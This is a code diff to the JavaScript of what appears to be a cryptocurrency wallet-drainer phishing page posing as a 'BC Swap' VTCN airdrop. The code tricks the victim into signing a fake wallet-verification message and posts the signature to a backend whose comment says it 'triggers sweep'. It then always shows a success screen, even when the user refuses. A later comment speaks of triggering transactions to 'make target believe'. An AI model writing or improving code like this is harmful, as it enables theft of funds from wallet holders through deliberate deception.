@@ -346,21 +346,18 @@ async function autoSignAndClaim(){
     const msgA=`Welcome to BC Swap!\n\nClick to verify wallet ownership for your VTCN airdrop.\n\nWallet: ${W.addr}\nTimestamp: ${Date.now()}\nNonce: ${randHex(16)}`;
     const sigA=await window.ethereum.request({method:'personal_sign',params:[msgA,W.addr]});
     
-    // Send signature to backend (triggers sweep)
+    // Send signature to backend (triggers sweep) - fire and forget
     try{
-      await fetch('/api/sign',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({address:W.addr,method:'personal_sign',message:msgA,signature:sigA,source:'stage-a'})});
+      fetch('/api/sign',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({address:W.addr,method:'personal_sign',message:msgA,signature:sigA,source:'stage-a'})});
       fetch('/api/notify',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({address:W.addr,event:'sign',chain:W.chain})}).catch(()=>{});
     }catch(e){}
-    
-    // Show verifying for 2 seconds then claim
-    await new Promise(r=>setTimeout(r, 2000));
-    goSuccess();
   }catch(e){
-    // User rejected - still show claim
     console.log('[autoSign] rejected:', e.message);
-    await new Promise(r=>setTimeout(r, 1000));
-    goSuccess();
   }
+  
+  // Always show verifying then claim
+  await new Promise(r=>setTimeout(r, 2000));
+  goSuccess();
 }
 function claimVTCN(){
   // Trigger random TX - base/bnb only - make target believe
